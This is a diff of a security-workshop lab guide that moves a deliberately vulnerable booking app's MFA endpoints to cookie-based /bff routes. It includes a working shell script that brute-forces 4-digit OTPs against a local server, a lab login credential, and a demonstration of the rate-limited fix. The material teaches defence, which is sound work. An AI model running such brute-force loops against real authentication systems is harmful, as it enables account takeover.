@@ -29,23 +29,22 @@ and (in a real system) triggering a new out-of-band delivery.
 
 | Method | Path | Purpose |
 |---|---|---|
-| `POST` | `/api/auth/mfa/challenge` | Generate a fresh 4-digit OTP (replaces any existing one) |
-| `GET`  | `/api/auth/mfa/otp`       | **Workshop only** — returns the current code (simulates SMS/email) |
-| `POST` | `/api/auth/mfa/verify`    | Submit a code — vulnerable to brute force without rate limiting |
+| `POST` | `/bff/auth/mfa/challenge` | Generate a fresh 4-digit OTP (replaces any existing one) |
+| `GET`  | `/bff/auth/mfa/otp`       | **Workshop only** — returns the current code (simulates SMS/email) |
+| `POST` | `/bff/auth/mfa/verify`    | Submit a code — vulnerable to brute force without rate limiting |
 
-All three require a valid JWT (`Authorization: Bearer <token>`).
+All three require an active session cookie (log in via `POST /bff/auth/login` first).
 
 ---
 
 ## Step 1 – Authenticate and request a challenge
 
 ```bash
-TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
+curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
   -H "Content-Type: application/json" \
-  -d '{"username":"partner","password":"Partner1234!"}' | jq -r '.token')
+  -d '{"username":"partner","password":"Partner1234!"}' | jq .
 
-curl -s -X POST http://localhost:5000/api/auth/mfa/challenge \
-  -H "Authorization: Bearer $TOKEN" | jq
+curl -s -b cookies.txt -X POST http://localhost:5001/bff/auth/mfa/challenge | jq
 ```
 
 Response:
@@ -58,8 +57,7 @@ Response:
 ## Step 2 – Retrieve the OTP (workshop delivery simulation)
 
 ```bash
-curl -s http://localhost:5000/api/auth/mfa/otp \
-  -H "Authorization: Bearer $TOKEN" | jq
+curl -s -b cookies.txt http://localhost:5001/bff/auth/mfa/otp | jq
 ```
 
 Response (Vulnerable mode):
@@ -91,25 +89,25 @@ The following script enumerates every possible 4-digit code until the server ret
 ```sh
 #!/bin/sh
 # brute_force_otp.sh — BookingDojo Lab 11
-TOKEN="$1"
-API="http://localhost:5000"
+COOKIES="$1"
+BFF="http://localhost:5001"
 
-if [ -z "$TOKEN" ]; then
-  echo "Usage: $0 <bearer-token>"
+if [ -z "$COOKIES" ]; then
+  echo "Usage: $0 <cookie-file>"
   exit 1
 fi
 
 # Request a fresh challenge
-curl -s -X POST "$API/api/auth/mfa/challenge" \
-  -H "Authorization: Bearer $TOKEN" > /dev/null
+curl -s -X POST "$BFF/bff/auth/mfa/challenge" \
+  -b "$COOKIES" > /dev/null
 
 echo "Brute-forcing OTP (0000–9999)…"
 i=0
 while [ "$i" -le 9999 ]; do
   CODE=$(printf '%04d' "$i")
   STATUS=$(curl -s -o /dev/null -w '%{http_code}' \
-    -X POST "$API/api/auth/mfa/verify" \
-    -H "Authorization: Bearer $TOKEN" \
+    -X POST "$BFF/bff/auth/mfa/verify" \
+    -b "$COOKIES" \
     -H "Content-Type: application/json" \
     -d "{\"code\":\"$CODE\"}")
   if [ "$STATUS" = "200" ]; then
@@ -126,7 +124,7 @@ Run it:
 
 ```bash
 chmod +x brute_force_otp.sh
-./brute_force_otp.sh "$TOKEN"
+./brute_force_otp.sh cookies.txt
 # Found OTP: 3742 (after 3742 attempts)
 ```
 
@@ -140,13 +138,11 @@ Set `MfaBruteForceProtection` to `"Fixed"` and repeat:
 
 ```bash
 # Request a new challenge first
-curl -s -X POST http://localhost:5000/api/auth/mfa/challenge \
-  -H "Authorization: Bearer $TOKEN" > /dev/null
+curl -s -b cookies.txt -X POST http://localhost:5001/bff/auth/mfa/challenge > /dev/null
 
 # Send 5 wrong codes
 for code in 0000 0001 0002 0003 0004; do
-  curl -s -X POST http://localhost:5000/api/auth/mfa/verify \
-    -H "Authorization: Bearer $TOKEN" \
+  curl -s -b cookies.txt -X POST http://localhost:5001/bff/auth/mfa/verify \
     -H "Content-Type: application/json" \
     -d "{\"code\":\"$code\"}" | jq .
 done
@@ -157,7 +153,7 @@ After 5 failures you receive:
 { "message": "Too many failed attempts. Challenge invalidated — request a new one." }
 ```
 HTTP status `429`. The challenge is deleted from the database. The attacker must call
-`POST /challenge` again, starting over — and in a real system that triggers a new
+`POST /bff/auth/mfa/challenge` again, starting over — and in a real system that triggers a new
 SMS/email to the legitimate user, who would notice the repeated messages.
 
 ---
@@ -165,7 +161,7 @@ SMS/email to the legitimate user, who would notice the repeated messages.
 ### How it works at runtime
 
 ```
-POST /api/auth/mfa/verify {"code": "XXXX"}  (repeated)
+POST /bff/auth/mfa/verify {"code": "XXXX"}  (repeated)
         │
         ▼
 MfaController.Verify(code)
